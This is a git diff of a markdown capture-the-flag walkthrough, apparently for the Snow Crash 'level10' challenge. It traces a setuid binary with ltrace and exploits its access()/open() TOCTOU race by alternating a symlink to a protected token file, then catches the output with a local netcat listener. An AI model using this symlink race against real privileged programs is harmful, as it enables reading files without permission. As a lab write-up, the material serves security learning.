@@ -7,7 +7,9 @@ Login
 > Password: s5cAJpM8ev6XHw998pRWG728z
 ```
 
-2 files, regular stuff
+Tryout
+- 2 files, seen it before
+- try - `cat` - `./level10` - `./level10 token localhost`
 
 ```b
 > ls -l
@@ -25,21 +27,23 @@ cat: token: Permission denied
 You don't have access to ./token
 ```
 
-ltrace
+Problem
+- The main issue here is file `./token` - we dont have its permission
+- `ltrace` - find out how `./level10` checks permission 
+  - it uses `access()` 
 
 ```b
 > ltrace ./level10 token localhost
 __libc_start_main(0x80486d4, 3, 0xbffff7d4, 0x8048970, 0x80489e0 <unfinished ...>
 access("token", 4)                                         = -1
 ^^^^^^ 🟡 
+
 printf("You don't have access to %s\n", "token"You don't have access to token
 )           = 31
 +++ exited (status 31) +++
 ```
 
-`access` - check if user has permissions for a file
-- we don't have permission for `token`
-- touch a file of our own, try again
+- Touch a file of our own, try again
 
 ```b
 > ./level10 /tmp/tmp localhost
@@ -54,13 +58,10 @@ fflush(0xb7fd1a20Connecting to localhost:6969 .. )         = 0
                                          ^^^^ 🟡 
 ```
 
-Idea
-- it eems the program interacts with `localhiost:6969`
+- The program interacts with `localhiost:6969`
 - we need a valid Host IP : 
-  - `127.0.0.1` or an old trick
+  - `127.0.0.1`, or the old trick
   - `ifconfig | grep 'inet ' | awk 'NR==2 {print $2}' | cut -d ":" -f2`
-
-With correct IP:
 
 ```b
 > ./level10 /tmp/tmp $(ifconfig | grep 'inet ' | awk 'NR==2 {print $2}' | cut -d ":" -f2)
@@ -68,29 +69,9 @@ Connecting to Localhost:6969 .. Connected!
 Sending file .. wrote file!
 ```
 
-Inspect w/ `ltrace`:
-
-```b
-> ltrace ./level10 /tmp/tmp $(ifconfig | grep 'inet ' | awk 'NR==2 {print $2}' | cut -d ":" -f2)
-.
-.
-.
-printf("Connected!\nSending file .. "Connected!
-)                     = 27
-fflush(0xb7fd1a20Sending file .. )                                         = 0
-open("/tmp/tmp", 0, 010)                                   = 4
-      ^^^^^^^^ 🟡 here is where we hope to force our token in
-
-read(4, "", 4096)                                          = 0
-write(3, "", 0)                                            = 0
-puts("wrote file!"wrote file!
-)                                        = 12
-+++ exited (status 12) +++
-```
-
-Maybe it sends content of our file to `localhost:6969`
-- try and intercept the content
-- for that we use a 2nd terminal
+nc, ltrace
+- it opens and reads and sends out `/tmp/tmp` content
+- it sends the content to `Localhost:6969`
 
 ```b
 # t1
@@ -103,19 +84,39 @@ Maybe it sends content of our file to `localhost:6969`
 Sending file .. wrote file!
 ```
 
-Figure out a way to make `./level10` to read the true `token`:
-- exploit `access()`'s [TOCTOU](https://stackoverflow.com/questions/75587120/how-to-handle-toctou-problem-between-access-and-unlink) vulnerability 
-- design a file to do the following:
-  - when `access()` is called it checks the low-priority file
-  - after that, `./level10` should `open()` and `read()` the high-priotity one
+- we want it to open/read/send the `token` instead!
 
-Solution: \
-to trick `access` we need a file that _alternates_ its type
-- a file of our own permission level
-- a symlink of the same name linked to `token`
-- we need an alternation script
+```b
+> ltrace ./level10 /tmp/tmp $(ifconfig | grep 'inet ' | awk 'NR==2 {print $2}' | cut -d ":" -f2)
+.
+.
+.
+printf("Connected!\nSending file .. "Connected!
+)                     = 27
+fflush(0xb7fd1a20Sending file .. )                                         = 0
+open("/tmp/tmp", 0, 010)                                   = 4
+      ^^^^^^^^ 🟡 here is where our `token` should be read
 
-👇
+read(4, "", 4096)                                          = 0
+write(3, "", 0)                                            = 0
+puts("wrote file!"wrote file!
+)                                        = 12
++++ exited (status 12) +++
+```
+
+Goal
+- Figure out a way to force `./level10` to read the true `token`:
+  - exploit `access()`'s [TOCTOU](https://stackoverflow.com/questions/75587120/how-to-handle-toctou-problem-between-access-and-unlink) vulnerability 
+- How: let's create a racing condition
+- Design a file to do the following:
+  - force `access()` to check a low-priority file
+  - then, `open()` and `read()` deal w/ the hi-priority one
+
+Solution:
+- we need a file that _alternates_ its own type
+  - type 1: a symlink to `token`
+  - type 2: a regular file of our own
+- write a script to do this 👇
 
 `alternate.sh`
 
@@ -134,8 +135,7 @@ done
 #'
 ```
 
-- a 2nd script to run `alternate` and `./level10` side by side
-- a oneliner to unite two previous ones and `netcat`
+- Another script to run `alternate` and `./level10` side by side
 
 `runner.sh`
 
@@ -149,7 +149,7 @@ done
 #'
 ```
 
-`oneliner`
+- Run `./alternate.sh` `./runner.sh` and `netcat` at the same time
 
 ```b
 > /tmp/alternate.sh 2>/dev/null & /tmp/runner.sh 2>/dev/null & nc -lk 6969
